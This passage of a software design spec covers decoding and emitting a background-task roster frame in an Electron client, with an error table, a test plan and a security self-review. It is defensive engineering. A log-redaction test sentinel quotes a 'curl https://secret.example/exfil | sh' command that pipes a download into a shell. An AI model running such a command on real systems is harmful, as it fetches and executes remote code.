- **No cross-check between `dropped_tasks` and `tasks.length`**, and no closed-set narrowing of `task_type` or
  of the `truncated_fields` element names.

## State + concurrency model

None introduced. This is a pure decode + emit leg: no store slice, no async task, no subscription, no timer,
no accumulated state. The event flows through the existing
`parseInboundMessage → daemonConnection dispatch → emitDaemonEvent → IPC → bridges` path already built for
`background_task_started` / `background_task_updated` / `queue_state`.

Statelessness is load-bearing, not incidental, and the temptation here is a *different* one from #565's.
That frame tempted a join; this one tempts a **diff**. It is a snapshot, the family has no terminal event, and
"a task vanished from the roster" is the only available finish signal — so holding the previous roster to
compute what disappeared looks like the obvious next step. **Do not.** It would be the only mutable state in
the leg, keyed by an attacker-influenceable `task_id` and fed directly by a hostile daemon's frame stream, and
the daemon is explicit that the finish inference is the **client's own conclusion**, not something the wire
reports. #567 owns that decision and its own bounding.

Ordering is claude's, not the daemon's: a roster can arrive **before** the `background_task_started` for a
task it lists. Emit what decoded; never hold a roster back waiting for rows to be explained. #565 already
shipped this rule for the update frame (`daemonConnection.ts:726-729`) and its test asserts the un-joined case
emits. N frames produce N events, in arrival order, with no work.

## Error handling

Ten reachable reject branches — three new `throw` statements plus seven existing-helper call sites. Every one
fails the **whole frame** closed; there is no partial roster.

| Layer | Failure | Result |
|---|---|---|
| `parseBackgroundTaskRosterPayload` | payload not a record (string, array, `null`) | throws `WireDecodeError('malformed background_task_roster payload')` — **new throw** |
| `parseBackgroundTaskRosterPayload` | `conversation_id` absent or non-string | throws via `requireString` |
| `parseBackgroundTaskRosterPayload` | `tasks` **`null`**, key omitted, or any non-array | throws `WireDecodeError('malformed tasks list')` — **new throw**; `Array.isArray(null)` is `false`, which is what makes the AC2 fail-closed half fall out of the shape |
| `parseBackgroundTaskRosterPayload` | `tasks` an **empty array** | **succeeds** — decodes to `[]`, the AC2 signal case ("roster observed, nothing alive") |
| `parseBackgroundTaskRosterPayload` | `dropped_tasks` absent or non-number (incl. the JSON string `'3'`) | throws via `requireNumber` |
| `parseBackgroundTaskRosterPayload` | `dropped_tasks` is `0` | **succeeds** — carried as `0`, never truthiness-tested, never range-checked |
| `parseBackgroundTask` | a row is not a record | throws `WireDecodeError('malformed background task')` — **new throw**; one bad row fails the whole frame |
| `parseBackgroundTask` | row `task_id` / `task_type` / `description` absent or non-string | throws via `requireString` |
| `requireStringArrayOrNull` | row `truncated_fields` key **omitted**, or a string / number / object | throws |
| `requireStringArrayOrNull` | row `truncated_fields` array containing a non-string element | throws — one bad element fails the **whole frame** closed |
| `requireStringArrayOrNull` | row `truncated_fields` literal `null` | returns `null` — a **value**, preserved as "nothing was cut for this row" |
| `requireStringArrayOrNull` | row `truncated_fields` `[]` | returns `[]` — valid, distinct from `null` |
| `parseInboundMessage` `case 'background_task_roster'` | any of the above | the narrower throws **before** the diagnostic-log call → no record is written for a malformed frame |
| `parseInboundMessage` | oversized frame | caught upstream by the frame-level `MAX_PLAINTEXT_BYTES` guard before this arm runs |
| `daemonConnection` dispatch | `WireDecodeError` from decode | swallowed by the connection's existing catch → the malformed frame is dropped without emitting or throwing |
| UI surface | — | none this slice; the event ships dormant. Rendering and error surfacing belong to #567 / #568 |

## Testing strategy

Test-first (CLAUDE.md): a failing test per criterion, implementation after. `npm test` (vitest) plus
`npm run typecheck` for the compile-guard arms — the `types.test.ts` block is **compile-only RED** (vitest
strips types, so `npm test` will not fail on it; `npm run typecheck` / `npm run build` will).

Scenarios below; the developer writes the bodies in the project's idiom. **Do not pre-write test code from
this spec.** Clone the cited blocks and retarget — the nested-array cases all have a `queue_state` twin.

### `src/shared/wire/types.test.ts`

- A compile-only block admitting `'background_task_roster'` as an `EnvelopeType` (clone :235).
- A compile-only block shaping `BackgroundTaskRosterPayload` as its **three** fields with `tasks` a **plain
  non-optional array** — the type-level pin that it is not `BackgroundTask[] | null`.
- A compile-only block shaping `BackgroundTask` as its **four** fields — explicitly the no-`tool_call_id` /
  no-`patch` pin, mirroring the sibling's "FOUR fields — the sibling minus three" block (:241). This is the
  type-level guard against trap 2.
- A block pinning that a row's `truncated_fields` accepts a literal `null` while `tasks` does not — the two
  contracts side by side, at the type level.

### `src/main/transport/inboundMessage.test.ts`

New `describe` blocks mirroring the `background_task_updated` pair at :1841 / :1935 and the `queue_state` pair
at :2242 / :2286, with an `encodeBackgroundTaskRoster(payload)` helper cloned from :179 (next free envelope
`id`), a `BACKGROUND_TASK_ROSTER` fixture seeded with **the daemon's full golden fixture payload verbatim**
(§ Context — two rows, `truncated_fields` populated on row 1 and `null` on row 2, `dropped_tasks: 3`,
`description` `grep -rn 'a<b&c' .` with its metacharacters intact), and a `BACKGROUND_TASK_ROSTER_EMPTY`
fixture from the empty golden fixture (`tasks: []`, `dropped_tasks: 0`).

**Recognition (AC1):**

- A valid envelope decodes to `{ kind: 'background-task-roster', backgroundTaskRoster: BACKGROUND_TASK_ROSTER }`.
- **Multi-row distinctness** — the core AC1 assertion, modelled on the `queue_state` per-row extraction at
  :2254-2259: assert `tasks.map(t => t.task_id)`, `.map(t => t.task_type)`, `.map(t => t.description)` and
  `.map(t => t.truncated_fields)` each equal the expected ordered arrays. Every field on every row must carry
  a distinct value in the fixture, so **a row swap, a dropped field, or a flattened `truncated_fields` fails**.
  The two rows' differing `truncated_fields` shapes (`['description']` vs `null`) are what make the flattening
  case detectable — assert row 1's is `['description']` **and** row 2's `toBeNull()`, not a merged list.
- `dropped_tasks` round-trips as `3`, asserted with `toBe(3)` and `typeof … === 'number'`.
- Order is preserved from the wire.

**Empty roster (AC2):**

- `BACKGROUND_TASK_ROSTER_EMPTY` decodes successfully to `tasks: []` — asserted with `toEqual([])`, and the
  decode result is **not** `null` (clone the `queue_state` empty case at :2266). The test's name and a comment
  must state what it distinguishes: **"roster observed, nothing alive"** vs **"no roster observed"**.
- `dropped_tasks: 0` decodes and is carried as `0`, asserted with `toBe(0)` — **not** a truthiness check
  (AC3).

**Fail-closed on `tasks` (AC2's other half) — the trap tests:**

- `tasks: null` throws `WireDecodeError`. Give this test an explicit comment naming the asymmetry: `null` is
  a valid value for a **row's** `truncated_fields` in this same frame, and is not one here.
- `tasks` key omitted throws.
- `tasks` a string / number / object throws.

**Fail-closed, frame level (AC3/AC4):**

- `conversation_id` absent and non-string — each throws.
- `dropped_tasks` absent throws (the AC3 fail-closed half); non-number (including the JSON string `'3'`)
  throws — the mistyped-counter case, mirroring `parseQueuedItem`'s `queued_msg_id` posture.
- A non-object payload (a string and an array) throws.

**Fail-closed, row level (AC4) — "one malformed row fails the whole frame":**

- A two-row `tasks` whose **second** row is not a record throws, and nothing partial is returned. Assert the
  throw only — the point is that row 1 does not survive.
- Per-row required strings: for each of `task_id` / `task_type` / `description`, one row missing it and one
  row with a number in it — each throws.
- Row `truncated_fields` a string / number / object throws; key omitted throws; an array containing a
  non-string element (`['description', 7]`) throws — pinning "one bad element fails the whole frame closed".
- Row `truncated_fields: []` decodes to `[]`, distinct from `null`.
- Row `truncated_fields` carrying a **future name** the client does not know decodes fine — the
  no-closed-set pin (clone :1906).

**Unknown keys tolerated but not copied (AC4) — both levels:**

- **Frame level:** a payload carrying spurious extra keys — use `truncated_fields` (the field this frame
  deliberately does **not** have at the top level, trap 3) plus `turn_id` — decodes to exactly the three known
  fields.
- **Row level:** a row carrying `tool_call_id` and `patch` — the sibling fields this row must never have,
  trap 2 — decodes to exactly the four known row fields. This doubles as the regression test for a row
  narrower wrongly cloned from `parseBackgroundTaskStartedPayload`.

**Regression:** a well-formed envelope of a *different* unmodeled type still returns `null` — the new case must
not widen what decodes.

**Content-free diagnostics** (clone the pair at :2979 / :3007, plus the row-borne-secret model at :3130):

- Success path logs exactly one record with `event: 'inbound-decoded'`, `code: 'background_task_roster'`, a
  `bytes` length and a `hash` — and **none of the decoded fields**. Seed a **row's** `description` with a
  recognisable command-text sentinel (the sibling uses `curl https://secret.example/exfil | sh`), a row
  `task_id` sentinel, and `conversation_id` with the file's `SECRET_CONV` sentinel, then assert every sentinel
  is absent from the serialized record. Assert `Object.keys(record).sort()` is exactly the existing
  content-free set `['bytes', 'code', 'event', 'hash', 'seq', 'ts']` — **with no `count`**, pinning that the
  roster size never reaches the log. No new `DiagnosticEvent` field.
- Malformed path (e.g. `tasks: null`) **logs nothing** — assert the log sink was not called, then assert the
  throw. This is the narrow-before-log guarantee.

### `src/main/daemonConnection.test.ts`

A new `describe` plus a `backgroundTaskRosterPlaintext(payload)` helper cloned from :302, driven through the
round-trip harness at :1977 (`drivers[0].emit({ type: 'message', plaintext })` against a `connected()`
fixture). **This leg is not compile-forced — these tests are the only guard on the emit:**

- **Round-trip (AC1):** a valid two-row frame emits **exactly one**
  `{ type: 'backgroundTaskRoster', conversationId, tasks, droppedTasks }`, asserted as a whole-object
  `toEqual` against the full expected shape including both rows. A whole-object assertion is what makes a
  swapped or dropped field fail — **and what catches a leftover `patch` / `toolCallId` copied from a sibling**
  (trap 2), since an extra emitted property fails `toEqual`.
- **`conversationId` is KEPT:** assert `events[0].conversationId` equals the frame's `conversation_id`. The
  sibling round-trip blocks are the model; **do not** clone `api_retry`'s inverse `not.toContain('conv-1')`
  assertion.
- **Empty roster emits (AC2):** a frame with `tasks: []` emits one event with `tasks` `toEqual([])` — it is
  **not** dropped, filtered, or coalesced (clone the `queue_state` empty-array emit at :2712). Pair it with a
  case where no frame arrives at all and assert zero events, so the test distinguishes the two states rather
  than asserting an empty array against an empty baseline.
- **`droppedTasks: 0` crosses as `0`** (AC3), asserted with `toBe(0)`.
- **Rows cross snake_case and by reference:** assert `events[0].tasks[0].task_id` — pinning that the row type
  is reused verbatim with no snake→camel, the `queueState` precedent. A camel-cased row fails this.
- **Per-row `truncatedFields` fidelity:** row 1's `truncated_fields` round-trips element-for-element in order,
  row 2's round-trips as `null` — in the **same** emitted event. This is the anti-flattening pin at the IPC
  layer.
- **Fail-closed drop:** a malformed frame (`tasks: null`) emits nothing and does not throw — the connection
  swallows `WireDecodeError`.
- **Anti-smuggling (AC4), both levels:** feed a frame whose payload carries an extra top-level key **and**
  whose first row carries an extra key (via `as unknown as`) and assert the emitted event has exactly the
  three modeled top-level properties and the row exactly its four — proving the fresh-literal emit and the
  fresh row literals, not spreads.
- **No dedup / no state / no diff:** two `background_task_roster` frames emit two events in arrival order; a
  verbatim repeat also emits; a frame listing a `task_id` **never opened by a `background_task_started`** on
  this connection still emits normally; and a frame whose roster is empty **after** a non-empty one emits
  normally with `tasks: []` rather than being suppressed or diffed. That last case pins the § State model rule
  that this layer holds no previous roster and draws no "finished" inference.

### Bridge no-op coverage (AC5)

- `daemonEventBridge.test.ts`: a `.toBeNull()` block for the new arm, cloned from :305.
- `modalBridge.test.ts` (:188) and `timelineBridge.test.ts` (:303): append the new arm to each `others` array,
  with the house one-line "ships dormant; its consumer is #567" comment. Use a **two-row** roster in the
  fixture so the arm is exercised with a populated nested array.
- **The store-level pin (AC5's "no chat timeline item is created"):** clone the `#565` test at
  `timelineBridge.test.ts:570` — using the `fakeBridge()` + `createTimelineStore()` + `subscribeTimeline`
  harness, emit a `backgroundTaskRoster` event and assert **both** halves of the referential-no-op pattern:
  `expect(store.getState()).toBe(before)` (the reducer returned the same state object) **and**
  `expect(selectItems(store.getState())).toHaveLength(0)`. The second assertion alone is vacuous against a
  store that was already empty; the pair is what actually pins it.

## Open questions

- **None blocking.** The wire shape is fully specified by pyrycode#1394 / `protocol-mobile.md:779-845` /
  `interactive.go:242` + `:313` / the two golden fixtures, all verified against the daemon tree 2026-08-19,
  and the slice structure mirrors #564 / #565 exactly with `queue_state` supplying the nested-row half.
- **Forward-compat posture (a recorded decision, not a question):** if the daemon later adds a field to
  `BackgroundTaskRosterPayload` or to `BackgroundTask`, this decoder tolerates-but-drops it until the slice is
  widened — the correct no-drift posture for a wire type (CLAUDE.md § Wire protocol).
- **Carry-forward for #567 / #568, not this slice's work:**
  (a) the roster is a **snapshot, not a delta** — #567 replaces its held set per frame rather than merging;
  (b) an **empty roster is the payoff signal** (`tasks: []` positively says nothing is alive) and must never
  be filtered out as "no news";
  (c) there is **no terminal event** in this family by design, so "finished" is the client's own conclusion
  drawn from absence in a later roster — legitimate for #567 to draw on its own terms, but it must own the
  state and the bounding, and must not present it as something the daemon reported;
  (d) `droppedTasks` must survive into the held set — the true roster size is `tasks.length + droppedTasks`,
  and a panel that shows only the carried rows silently presents a capped roster as the whole one;
  (e) each row's `truncatedFields` is **per row**, must not be hoisted or flattened, and `null` must not be
  collapsed into `[]`;
  (f) the `task_id` join across all three frames is #567's, and it must tolerate a roster arriving **before**
  the `background_task_started` for a task it lists, since ordering is claude's;
  (g) **SECURITY:** every row's `description` is untrusted, model-influenced text and for
  `task_type: local_bash` is the literal command line — inert text rendering only, never an HTML / attribute /
  URL sink, never executed or re-shelled, and the *list* shape is not an invitation to feed it somewhere
  structured.

## Security review

**Verdict:** PASS

This slice receives an untrusted daemon `background_task_roster` frame (hostile-daemon threat), fail-closed
decodes it, and emits an event carrying **one identifier, a bounded list of four-field rows, and a count**
across the main→renderer IPC boundary. Versus the two shipped siblings this is a **widening in shape** (a
nested array replaces flat scalars) at the **same** hazard class, and the daemon deliberately restates the
render-never-execute rule per row rather than delegating it to the scalar frame — on the explicit grounds that
a **list** of command lines is a more tempting shape to feed somewhere structured than a single one. The
categories are walked against that specific temptation.

**Findings:**

1. **[Trust boundaries]** No finding, and the boundary is **two-level** here — the one structural difference
   from the siblings. `parseInboundMessage`'s `case 'background_task_roster'` →
   `parseBackgroundTaskRosterPayload` → `parseBackgroundTask` per row: two named fail-closed narrowers, not
   scattered parsing. Both return **fresh literals**, never a spread of the incoming record, so a hostile
   `__proto__` / `constructor` key cannot pollute at either level — and the row level matters more than usual,
   because the attacker controls the *number* of records offered to the narrower, not just their content.
   `requireStringArrayOrNull` likewise returns a fresh array rather than the wire array, so array-borne extra
   properties cannot ride along on any row. The emit is a fresh named-field literal at the top level and
   passes the already-narrowed row array by reference, so exactly the validated values cross IPC and a
   later-added decoder field cannot smuggle itself across. Downstream holds a discriminated-union arm. The
   event flows main→renderer only; no new renderer→main channel is added.

2. **[Tokens, secrets, credentials]** N/A — no token, secret, credential, or key is generated, stored, read,
   rotated, or compared. `conversation_id` and each row's `task_id` are routing / correlation identifiers, not
   secrets. Thrown `WireDecodeError` messages name the failure **category and field name** only, never
   interpolating a value — which matters sharply here because a value interpolation would put a row's
   `description`, *which is a literal command line*, into an error string that a crash reporter would capture.
   Note also that a row-level message must not interpolate the row **index**: it would be a weak oracle over
   roster contents and buys nothing, and `parseQueuedItem` sets the precedent of naming the category only.

3. **[File / storage operations]** N/A — no filesystem, disk, cache, or web-storage operation. Nothing is
   persisted, so path-traversal, TOCTOU, atomic-write and encryption-at-rest questions do not arise. Stated
   explicitly because a `description` is a shell command line and routinely contains paths (the golden
   fixture's is `grep -rn 'a<b&c' .`): no decoded value is concatenated into a path, opened, globbed, or
   written anywhere in this slice, and #567 holds the roster in memory only.

4. **[Inter-process / Electron attack surface]** No finding. No new `BrowserWindow`, `webPreferences`,
   `contextBridge` API, `ipcMain.handle`, or `ipcMain.on` channel — the event rides the existing
   `emitDaemonEvent` → IPC path. All values are validated **before** they cross (typed at both narrowers,
   re-copied by name at the top level of the emit): main validates, then hands the renderer an already-narrowed
   value. `string`, `number`, `string[]` and arrays of plain objects are structured-clone-safe, so there is no
   deserialization surface on the renderer side; the row array is plain data with no functions, getters, or
   prototypes (fresh object literals from `parseBackgroundTask`). Process placement is preserved per
   CLAUDE.md — decode, socket, and Noise stay in main; the renderer receives only the typed event.

5. **[Cryptographic primitives]** N/A — no RNG, key, nonce, Noise, or compare-against-a-secret work. The slice
   reuses exactly one vetted primitive, the content-free `hashPlaintext` diagnostic helper (#130), unchanged.

6. **[Injection / untrusted text — the real finding, and how it is discharged]** Each row's `description`
   carries the same literal command line as `background_task_started.description`, under a tighter producer
   cap. The daemon bounds it but does not sanitize its content, and the golden fixture is *deliberately*
   adversarial: `grep -rn 'a<b&c' .` ships HTML metacharacters on purpose. `task_type` is likewise an open,
   model-influenced string.

   **Classification: no exploitable sink exists in this slice, and the constraint is carried forward
   explicitly rather than assumed.** This slice has **zero** DOM sinks, zero shell invocations, zero URL
   construction, zero attribute assignment, and zero `JSON.parse` on any decoded value. It decodes to a typed
   value and emits it. React escapes text children, so the eventual #568 render is inert *by default*; the
   dangerous shapes are `dangerouslySetInnerHTML`, an attribute / `href` / `src` sink, and — the temptation
   unique to *this* frame — treating the array as a **structured work list** rather than a display list: a
   list of command lines invites being fed to something that iterates and acts, in a way a single string does
   not. None exists yet, and none may be introduced without a security-sensitive ticket of its own.

   The discharge is fivefold, all mandated above rather than left to reviewer memory: (a) the `BackgroundTask`
   doc-comment (§ Design 1b) carries the daemon's per-row SECURITY paragraph **including its stated reason**
   for repeating it per row; (b) the `DaemonEvent` arm doc-comment (§ Design 3) repeats the inherited
   constraint at the type the renderer actually imports; (c) the content-free diagnostic test seeds a **row's**
   `description` with a command-text sentinel and asserts it never reaches the log; (d) the round-trip test
   asserts the metacharacter-bearing golden `description` crosses byte-for-byte, so a future
   "sanitize/normalize at the decoder" change fails a test rather than passing silently; (e) the constraint is
   restated as a named carry-forward to #567 and #568 under § Open questions.

   **Rejected mitigation — escaping, stripping, or allowlisting at the decoder.** Stripping metacharacters
   would corrupt a display blob and present altered text as claude's — and would break on the daemon's own
   canonical fixture. HTML-escaping at the transport is the wrong layer twice over: it would double-escape
   under React's own escaping at the sink, and it would bake a *rendering* concern into a wire type shared with
   non-DOM consumers. Narrowing `task_type` to `'local_bash'` would fail-close every valid future frame on one
   observation. Narrowing the `truncated_fields` element names would do the same — and this row's set
   (`task_id` / `task_type` / `description`) is a **third** distinct set from #564's and #565's, which is the
   concrete proof the vocabulary moves per frame. All are the wrong layer: the defence belongs at the sink, and
   the sink does not exist yet.

7. **[Error messages, logs, telemetry]** No finding. The diagnostic reuses the existing content-free field set
   (`event` / `code: 'background_task_roster'` / `bytes` / `hash`) with **no new `DiagnosticEvent` field**, so
   #131's renderer pin is untouched, and **no decoded field is logged** — least of all a row `description`,
   which would write a literal command line into the diagnostic log. **Deliberately no `count` either, and
   that is a real restraint rather than an absent capability**: `DiagnosticEvent` already carries a
   `count?: number` field (`diagnosticLog.ts:48`), so logging the roster size would cost nothing structurally.
   It is omitted because the roster size is itself a fact about the user's session — how much work claude has
   running right now — and the `queue_state` / `conversation_created` posture is to omit it. § Design 2e
   forbids adding one and a dedicated test asserts the record's key set is exactly the existing one, with
   row-borne and frame-borne sentinels both absent. The arm narrows **before**
   logging, so a malformed frame throws first and leaves no record (its own test). Thrown `WireDecodeError`
   messages carry the failure category and field *name* only — never a value, and never a row index — so a
   crash reporter or telemetry sink capturing the error object leaks no command text and gains no oracle over
   roster contents. Nothing is piped to the renderer console.

8. **[Concurrency]** No finding, and the design is deliberately stateless. No async task, timer, subscription,
   listener, or shared mutable state is introduced; decode + emit is synchronous within the existing inbound
   dispatch, so there is no check-then-act race across an `await`, nothing to cancel on teardown, and no
   shutdown-safety question. Security-relevant inversion worth naming, and it is a *different* temptation from
   the sibling's: this frame is a **snapshot in a family with no terminal event**, so computing "what
   disappeared" by holding the previous roster looks like the obvious next step. It would introduce the only
   mutable state in the leg, keyed by an attacker-influenceable `task_id`, fed directly by a hostile daemon's
   frame stream, and — unlike a scalar frame — **each frame carries an attacker-chosen number of rows**, so a
   held-and-diffed set is a growth surface a flood can drive. The spec forbids the diff (§ Non-goals, § State
   model) and a round-trip test pins that an empty roster following a non-empty one still emits rather than
   being suppressed.

9. **[Threat model alignment]** Addressed. **Hostile daemon response** is the applicable threat: malformed,
   mistyped, or truncated fields → `WireDecodeError` → swallowed by the connection → frame dropped, no emit, no
   crash; one bad **row** fails the whole frame rather than yielding a partial roster (its own test); an
   omitted `tasks`, `dropped_tasks`, or per-row `truncated_fields` key fails closed rather than being read as
   empty, zero, or `null`; `tasks: null` fails closed even though a row's `truncated_fields: null` does not.
   Oversized frames are capped upstream by `MAX_PLAINTEXT_BYTES` **before** the narrower runs — which is what
   bounds the row count without a client-invented `maxTaskRosterEntries` mirror that would fail-close valid
   future frames. Hostile *content* in a `description` is handled per finding 6. **Malicious / compromised
   relay:** content-blind and unable to forge frames inside the Noise session; it can flood, but each frame
   decodes to a fixed-shape emit with **no accumulated state** (no growing list, no timer, no map keyed by an
   attacker-controlled `task_id` — that map is #567's, and #567 owns its own bounding), so a flood costs CPU and
   transient allocation proportional to bytes delivered, both already bounded by the frame cap, and nothing
   more. Rate/framing posture is inherited from the relay connection, not introduced here. **Renderer
   compromise reaching the transport:** unchanged — this slice adds no renderer→main capability. **Token theft
   from disk:** N/A, nothing persisted. **OUT OF SCOPE and named:** all rendering, formatting, snapshot
   diffing, "finished" inference, and any client-side state derived from this event belong to #567 (store) and
   #568 (panel).

**Reviewer:** architect (self-review per `architect/security-review.md`)
**Date:** 2026-08-19
